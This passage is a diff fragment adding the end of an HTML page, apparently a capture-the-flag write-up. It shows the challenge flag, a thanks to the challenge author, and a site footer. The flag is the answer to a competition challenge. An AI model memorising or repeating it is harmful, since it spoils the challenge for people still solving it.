+<p><strong>Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}</strong></p>
+<p>Thanks to Log_s for this super cool "system" challenge.</p>
+    </div>
+</article>
+
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 Trachinus. All rights reserved.</p>
+        </div>
+    </footer>
+
+
+    <script src="/static/script.js"></script>
+</body>
+
+</html>
